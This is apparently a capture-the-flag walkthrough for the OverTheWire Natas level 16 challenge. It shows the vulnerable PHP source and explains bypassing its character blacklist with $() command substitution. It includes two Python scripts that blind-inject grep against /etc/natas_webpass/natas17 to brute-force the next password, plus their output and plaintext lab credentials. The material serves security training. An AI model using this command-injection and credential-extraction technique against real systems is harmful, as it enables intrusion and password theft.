`Link` : `https://overthewire.org/wargames/natas/natas16.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟓 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟔
## 𝐆𝐢𝐯𝐞𝐧
- Username: natas16
- URL:      `http://natas16.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:     `http://natas16.natas.labs.overthewire.org`
- `viewsource`

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
- Notice: `  if(preg_match('/[;|&`\'"]/',$key)) {`
- All possible characters for command injection are blocked
- We have `passthru("grep -i \"$key\" dictionary.txt");`
- What could you think of?
  - [ ] character escape won't work
  - [ ] encoding won't work because of preg_match
  - [x] In bash, we can pass output of another command into another command using `$(command)`

- Let's check if `$(echo hello)` works! It works
- Now: `grep -i "$(command)" dictionary.txt"`
  - It means whatever will be the output of `command`, that string will get searched into dictonary.txt
- Let's find a unique word in dictionary! Let's say `Americanisms`
- We can now brute force password!
- The logic will be:
  - If output of a command will be null, then `Americanisms` will be displayed, else no output
  - we can use `grep` to do this 
  - For example:
    - If a character exists then we will get a long output which when searched for in `dictionary.txt` will result in no output & vice versa
    - ![image](https://user-images.githubusercontent.com/68887544/149658683-1b8a802c-d7bb-4e04-ac0d-d88139734b74.png)
- Let's write a brute force script:

```
import requests

print("brute forcing existing chars!")

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

word = "Americanisms"
exists = ""

for char in characters:
    url = "http://natas16.natas.labs.overthewire.org/index.php?needle=Americanisms%24(grep "+ char +" /etc/natas_webpass/natas17)&submit=Search"
    response = requests.get(url, auth=(username, password))
    if word not in response.text:
        exists += char
    print("checked: ", char, end="\r")

print("exists: ", exists)

```

```
                                                                                                                 
┌──(shreyas㉿kali)-[~/scripts]
└─$ python3 natas16-chars.py
brute forcing existing chars!
exists:  bcdghkmnqrswAGHNPQSW035789

```

- Now that we determined which characters exists and which not, we can use regex to brute force exact password
- `grep ^chars filename`:
  - ![image](https://user-images.githubusercontent.com/68887544/149658838-13227bc0-a248-4e20-abc5-27f7ecea4d73.png)


```
import requests

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

exists = "bcdghkmnqrswAGHNPQSW035789"
word = "Americanisms"
natas17_password = ""
length = 32 - len(natas17_password)

print("Characters: ", exists)
print("Starting brute force! Enjoy till then...")

while length:
    for char in exists:
        url = "http://natas16.natas.labs.overthewire.org/index.php?needle=Americanisms%24(grep ^"+ natas17_password + char +" /etc/natas_webpass/natas17)&submit=Search"
        response = requests.get(url, auth=(username, password))
        if word not in response.text:
            natas17_password += char
        length = 32 - len(natas17_password)

    print(f"remaining length: {length} & password: {natas17_password}")

```
```
                                                                                             
┌──(shreyas㉿kali)-[~/scripts]
└─$ python3 natas16-bruteforce.py
Characters:  bcdghkmnqrswAGHNPQSW035789
Starting brute force! Enjoy till then...
remaining length: 31 & password: 8
remaining length: 30 & password: 8P
remaining length: 28 & password: 8Ps3
remaining length: 26 & password: 8Ps3H0
remaining length: 24 & password: 8Ps3H0GW
remaining length: 21 & password: 8Ps3H0GWbn5
remaining length: 20 & password: 8Ps3H0GWbn5r
remaining length: 18 & password: 8Ps3H0GWbn5rd9
remaining length: 16 & password: 8Ps3H0GWbn5rd9S7
remaining length: 15 & password: 8Ps3H0GWbn5rd9S7G
remaining length: 13 & password: 8Ps3H0GWbn5rd9S7GmA
remaining length: 10 & password: 8Ps3H0GWbn5rd9S7GmAdgQ
remaining length: 9 & password: 8Ps3H0GWbn5rd9S7GmAdgQN
remaining length: 7 & password: 8Ps3H0GWbn5rd9S7GmAdgQNdk
remaining length: 5 & password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
remaining length: 2 & password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
remaining length: 0 & password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

```

- `remaining length: 0 & password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

## 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠

- Regular expression (Learn from the linux commandline book)
